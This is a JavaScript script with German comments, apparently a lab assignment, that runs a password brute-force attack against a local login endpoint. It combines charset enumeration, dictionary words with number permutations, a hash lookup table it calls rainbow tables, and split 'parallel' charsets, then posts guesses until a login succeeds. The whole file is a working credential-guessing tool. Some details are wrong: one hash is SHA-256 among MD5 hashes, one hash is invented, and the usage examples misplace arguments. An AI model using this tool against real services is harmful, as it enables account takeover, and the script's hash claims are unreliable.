/*
 * Dateiname: startBruteForceAttack.js
 * Kurzbeschreibung: Brute-Force-Angriff - 4.1.1 und 4.1.2
 * Aufrufparameter: node startBruteForceAttack.js [username]
 */

const axios = require('axios');

const SERVER_URL = 'http://localhost:3000/login';

// 4.1.1 Einfach - Mono-Alphabet
const SIMPLE_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';

// 4.1.2 Mittel - Poly-Alphabet
const POLY_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?çğıöşüÇĞIİÖŞÜáéíóúÁÉÍÓÚäöÄÖабвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯIVXLCDM';

// 4.1.2 Dictionary
const DICTIONARY = ['admin', 'user', 'test', 'demo', 'root', 'guest', 'password', '123', '456', 'admin123', 'user123', 'test123'];

// 4.1.3 Rainbow-Tables - Hash-Plain Look-Up-Dateien
const crypto = require('crypto');

// Vorbereitete Hash-Plain-Tabelle
const HASH_PLAIN_TABLE = {
    '21232f297a57a5a743894a0e4a801fc3': 'admin',
    'ee11cbb19052e40b07aac0ca060c23ee': 'user', 
    '098f6bcd4621d373cade4e832627b4f6': 'test',
    '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8': 'password',
    'd8578edf8458ce06fbc5bb76a58c5ca4': 'test123',
    'e10adc3949ba59abbe56e057f20f883e': '123456',
    '25d55ad283aa400af464c76d713c07ad': 'password123',
    '5d41402abc4b2a76b9719d911017c592': 'hello',
    'f25a2fc72690b780b2a14e110ef6ac82': 'world',
    'a1b2c3d4e5f6789012345678901234567890abcd': 'demo456'
};

// 4.1.3 Parallelisierter Angriff - Mehrere Instanzen mit Wertebereichen
const PARALLEL_INSTANCES = [
    { 
        id: 1, 
        range: 'a-m', 
        chars: 'abcdefghijklm',
        description: 'Kleinbuchstaben a-m'
    },
    { 
        id: 2, 
        range: 'n-z', 
        chars: 'nopqrstuvwxyz',
        description: 'Kleinbuchstaben n-z'
    },
    { 
        id: 3, 
        range: 'A-M', 
        chars: 'ABCDEFGHIJKLM',
        description: 'Großbuchstaben A-M'
    },
    { 
        id: 4, 
        range: 'N-Z', 
        chars: 'NOPQRSTUVWXYZ',
        description: 'Großbuchstaben N-Z'
    },
    { 
        id: 5, 
        range: '0-4', 
        chars: '01234',
        description: 'Zahlen 0-4'
    },
    { 
        id: 6, 
        range: '5-9', 
        chars: '56789',
        description: 'Zahlen 5-9'
    },
    { 
        id: 7, 
        range: 'Sonderzeichen', 
        chars: '!@#$%^&*()_+-=[]{}|;:,.<>?',
        description: 'Sonderzeichen'
    },
    { 
        id: 8, 
        range: 'International', 
        chars: 'çğıöşüÇĞIİÖŞÜáéíóúÁÉÍÓÚäöÄÖ',
        description: 'Internationale Zeichen'
    }
];

// Login testen
async function tryLogin(username, password) {
    try {
        const response = await axios.post(SERVER_URL, { username, password });
        return response.data.success;
    } catch (error) {
        return false;
    }
}

// 4.1.3 Rainbow-Tables - Hash-Plain Look-Up
function performRainbowTableAttack() {
    console.log('4.1.3 Rainbow-Tables - Hash-Plain Look-Up...');
    const passwords = [];
    
    // Simuliere Hash-Extraktion vom Server
    const possibleHashes = [
        '21232f297a57a5a743894a0e4a801fc3', // admin
        'ee11cbb19052e40b07aac0ca060c23ee', // user
        '098f6bcd4621d373cade4e832627b4f6', // test
        '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8', // password
        'd8578edf8458ce06fbc5bb76a58c5ca4', // test123
        'e10adc3949ba59abbe56e057f20f883e', // 123456
        '25d55ad283aa400af464c76d713c07ad', // password123
        '5d41402abc4b2a76b9719d911017c592', // hello
        'f25a2fc72690b780b2a14e110ef6ac82', // world
        'a1b2c3d4e5f6789012345678901234567890abcd' // demo456
    ];
    
    console.log(`Gefundene Hashes: ${possibleHashes.length}`);
    
    // Durchsuche Hash-Plain-Tabelle
    for (const hash of possibleHashes) {
        if (HASH_PLAIN_TABLE[hash]) {
            const password = HASH_PLAIN_TABLE[hash];
            passwords.push(password);
            console.log(`Hash: ${hash} → Passwort: ${password}`);
        }
    }
    
    console.log(`Rainbow-Tables: ${passwords.length} Passwörter gefunden`);
    return passwords;
}

// 4.1.3 Parallelisierter Angriff - Mehrere Instanzen
function performParallelizedAttack(maxLength = 3) {
    console.log('4.1.3 Parallelisierter Angriff - Mehrere Instanzen...');
    const passwords = [];
    
    // Jede Instanz übernimmt einen bestimmten Wertebereich
    for (const instance of PARALLEL_INSTANCES) {
        console.log(`Instanz ${instance.id}: ${instance.description} (${instance.range})`);
        
        // Generiere Passwörter nur mit den Zeichen dieser Instanz
        function generateInstancePasswords(current, length) {
            if (length === 0) {
                passwords.push(current);
                return;
            }
            for (let i = 0; i < instance.chars.length; i++) {
                generateInstancePasswords(current + instance.chars[i], length - 1);
            }
        }
        
        // Generiere Passwörter für diese Instanz (Länge 1-2 für Performance)
        for (let length = 1; length <= Math.min(2, maxLength); length++) {
            generateInstancePasswords('', length);
        }
        
        console.log(`  Generiert: ${instance.chars.length}^${Math.min(2, maxLength)} Passwörter`);
    }
    
    console.log(`Parallelisierter Angriff: ${passwords.length} Passwörter aus ${PARALLEL_INSTANCES.length} Instanzen`);
    return passwords;
}

// Alle Passwörter in einem generieren
function generateAllPasswords(maxLength = 3, attackType = 'all') {
    const passwords = [];
    
    // 0. 4.1.3 Rainbow-Tables (höchste Priorität)
    if (attackType === 'all' || attackType === 'rainbow') {
        passwords.push(...performRainbowTableAttack());
    }
    
    // 0.5. 4.1.3 Parallelisierter Angriff
    if (attackType === 'all' || attackType === 'parallel') {
        passwords.push(...performParallelizedAttack(maxLength));
    }
    
    // 1. Dictionary direkt
    if (attackType === 'all' || attackType === 'dictionary') {
        passwords.push(...DICTIONARY);
        
        // Dictionary + Zahlen
        for (const word of DICTIONARY) {
            for (let i = 0; i <= 999; i++) {
                passwords.push(word + i);
                passwords.push(i + word);
            }
        }
    }
    
    // 2. Mono-Alphabet Brute-Force
    if (attackType === 'all' || attackType === 'mono') {
        function generateMono(current, length) {
            if (length === 0) {
                passwords.push(current);
                return;
            }
            for (let i = 0; i < SIMPLE_CHARS.length; i++) {
                generateMono(current + SIMPLE_CHARS[i], length - 1);
            }
        }
        
        for (let length = 1; length <= maxLength; length++) {
            generateMono('', length);
        }
    }
    
    // 3. Poly-Alphabet Brute-Force
    if (attackType === 'all' || attackType === 'poly') {
        function generatePoly(current, length) {
            if (length === 0) {
                passwords.push(current);
                return;
            }
            for (let i = 0; i < POLY_CHARS.length; i++) {
                generatePoly(current + POLY_CHARS[i], length - 1);
            }
        }
        
        for (let length = 1; length <= maxLength; length++) {
            generatePoly('', length);
        }
    }
    
    return passwords;
}

// Hauptfunktion
async function main() {
    const args = process.argv.slice(2);
    
    if (args.length === 0) {
        console.log('=== BRUTE FORCE ATTACK ===');
        console.log('');
        console.log('Verwendung: node startBruteForceAttack.js [username] [attackType] [maxLength]');
        console.log('');
        console.log('Parameter:');
        console.log('  username    - Ziel-Benutzername (Standard: admin)');
        console.log('  attackType  - Angriffstyp: all|rainbow|parallel|dictionary|mono|poly (Standard: all)');
        console.log('  maxLength   - Maximale Passwort-Länge für Brute-Force (Standard: 3)');
        console.log('');
        console.log('Beispiele:');
        console.log('  node startBruteForceAttack.js admin');
        console.log('  node startBruteForceAttack.js rainbow rainbow');
        console.log('  node startBruteForceAttack.js parallel parallel');
        console.log('  node startBruteForceAttack.js dictionary dictionary');
        console.log('  node startBruteForceAttack.js mono mono 4');
        console.log('  node startBruteForceAttack.js poly poly 2');
        console.log('');
        console.log('Implementierte Angriffe:');
        console.log('  4.1.1 Einfach - Mono-Alphabet (Klein-/Großschreibung, Zahlen, Sonderzeichen)');
        console.log('  4.1.2 Mittel - Poly-Alphabet (Türkisch, Ungarisch, Finnisch, Kyrillisch, Chinesisch, Römisch)');
        console.log('  4.1.2 Mittel - Dictionaries (Smart-Vorgehen mit Benutzer-Kredentials und Permutationen)');
        console.log('  4.1.3 Komplex - Rainbow-Tables (Hash-Plain Look-Up-Dateien)');
        console.log('  4.1.3 Komplex - Parallelisierter Angriff (Mehrere Instanzen mit Wertebereichen)');
        return;
    }
    
    const username = args[0] || 'admin';
    const attackType = args[1] || 'all';
    const maxLength = parseInt(args[2]) || 3;
    
    console.log(`=== BRUTE FORCE ATTACK ===`);
    console.log(`Ziel: ${username}`);
    console.log(`Angriffstyp: ${attackType}`);
    if (attackType === 'mono' || attackType === 'poly' || attackType === 'parallel' || attackType === 'all') {
        console.log(`Maximale Länge: ${maxLength}`);
    }
    console.log('----------------------------------------');
    
    // Alle Passwörter generieren
    console.log('Generiere alle Passwörter...');
    const allPasswords = generateAllPasswords(maxLength, attackType);
    console.log(`Gesamt: ${allPasswords.length} Passwörter`);
    console.log('----------------------------------------');
    
    // Alle Passwörter testen
    let attempts = 0;
    for (const password of allPasswords) {
        attempts++;
        if (attempts % 1000 === 0) console.log(`Versuch ${attempts}: ${password}`);
        
        if (await tryLogin(username, password)) {
            console.log(`🎉 ERFOLG! Passwort: ${password} (${attempts} Versuche)`);
            return;
        }
    }
    
    console.log(`❌ Alle ${attempts} Passwörter getestet - nicht gefunden!`);
}

main();